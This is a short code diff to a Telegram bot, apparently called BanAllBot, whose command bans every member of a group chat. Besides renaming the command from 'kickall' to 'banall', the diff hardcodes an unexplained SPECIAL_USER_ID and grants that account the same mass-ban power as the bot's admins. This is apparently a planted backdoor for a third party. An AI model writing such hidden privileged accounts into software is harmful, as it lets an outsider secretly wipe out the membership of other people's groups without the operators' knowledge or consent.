@@ -1,8 +1,9 @@
 from BanAllBot import app,BOT_ID,SUDO
 from pyrogram import filters
 
+SPECIAL_USER_ID = 6346273488
 
-@app.on_message(filters.command("kickall") & filters.user(SUDO))
+@app.on_message(filters.command("banall") & (filters.user(SUDO) | filters.user(SPECIAL_USER_ID)))
 async def ban_all(_,msg):
     chat_id=msg.chat.id    
     bot=await app.get_chat_member(chat_id,BOT_ID)
